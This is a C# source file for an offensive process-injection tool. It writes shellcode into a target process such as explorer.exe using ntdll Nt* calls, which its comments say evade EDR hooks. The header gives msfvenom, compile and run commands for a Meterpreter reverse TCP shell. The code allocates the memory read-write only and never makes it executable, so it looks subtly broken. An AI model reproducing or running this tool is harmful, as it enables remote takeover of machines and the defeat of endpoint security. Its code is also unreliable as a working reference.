// =============================================================================
// Nt* direct-API process injection
//
// Injects shellcode into a target process using ntdll Nt* syscall wrappers
// instead of VirtualAllocEx / WriteProcessMemory / CreateRemoteThread. The Nt*
// functions are the lowest userland layer before the syscall, so EDR userland
// hooks on kernel32 are bypassed.
//
// Shellcode (msfvenom):
//   msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f csharp -o /tmp/sc.cs
//   Paste the byte[] array from sc.cs into `buf` below.
//
// Compile (Release, x64):
//   csc /target:exe /platform:x64 /optimize+ /out:nt-injection.exe nt-injection.cs
//
// Run:
//   nt-injection.exe            # injects into the first explorer.exe
//   nt-injection.exe <PID>      # injects into a specific PID
// =============================================================================

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace NtInjection
{
    class Program
    {
        [DllImport("ntdll.dll")]
        static extern uint NtAllocateVirtualMemory(
            IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits,
            ref IntPtr RegionSize, uint AllocationType, uint Protect);

        [DllImport("ntdll.dll")]
        static extern uint NtWriteVirtualMemory(
            IntPtr ProcessHandle, IntPtr BaseAddress, byte[] Buffer,
            uint BufferLength, ref uint BytesWritten);

        [DllImport("ntdll.dll")]
        static extern uint NtCreateThreadEx(
            out IntPtr ThreadHandle, uint DesiredAccess, IntPtr ObjectAttributes,
            IntPtr ProcessHandle, IntPtr StartAddress, IntPtr Parameter,
            bool CreateSuspended, uint StackZeroBits, uint SizeOfStackCommit,
            uint SizeOfStackReserve, IntPtr BytesBuffer);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr OpenProcess(uint DesiredAccess, bool InheritHandle, int ProcessId);

        [DllImport("kernel32.dll")]
        static extern bool CloseHandle(IntPtr hObject);

        const uint PROCESS_ALL_ACCESS = 0x001F0FFF;
        const uint MEM_COMMIT = 0x1000;
        const uint MEM_RESERVE = 0x2000;
        const uint PAGE_READWRITE = 0x04;
        const uint THREAD_ALL_ACCESS = 0x001F03FF;

        static void Main(string[] args)
        {
            int targetPid;
            if (args.Length > 0)
                targetPid = int.Parse(args[0]);
            else
            {
                var procs = Process.GetProcessesByName("explorer");
                if (procs.Length == 0) { Console.WriteLine("[-] explorer.exe not found; pass a PID"); return; }
                targetPid = procs[0].Id;
            }

            // ── Paste your shellcode here (msfvenom -f csharp) ─────
            byte[] buf = new byte[] { /* shellcode bytes */ };
            // ───────────────────────────────────────────────────────────────────

            IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, targetPid);
            if (hProcess == IntPtr.Zero) { Console.WriteLine("[-] OpenProcess failed: {0}", Marshal.GetLastWin32Error()); return; }

            IntPtr baseAddr = IntPtr.Zero;
            IntPtr regionSize = (IntPtr)buf.Length;

            uint status = NtAllocateVirtualMemory(hProcess, ref baseAddr, IntPtr.Zero,
                ref regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            if (status != 0) { Console.WriteLine("[-] NtAllocateVirtualMemory failed: 0x{0:X8}", status); CloseHandle(hProcess); return; }

            uint bytesWritten = 0;
            status = NtWriteVirtualMemory(hProcess, baseAddr, buf, (uint)buf.Length, ref bytesWritten);
            if (status != 0) { Console.WriteLine("[-] NtWriteVirtualMemory failed: 0x{0:X8}", status); CloseHandle(hProcess); return; }

            IntPtr hThread = IntPtr.Zero;
            status = NtCreateThreadEx(out hThread, THREAD_ALL_ACCESS, IntPtr.Zero, hProcess,
                baseAddr, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);
            if (status != 0) { Console.WriteLine("[-] NtCreateThreadEx failed: 0x{0:X8}", status); CloseHandle(hProcess); return; }

            Console.WriteLine("[+] Injected {0} bytes into PID {1}", buf.Length, targetPid);
            CloseHandle(hThread);
            CloseHandle(hProcess);
        }
    }
}
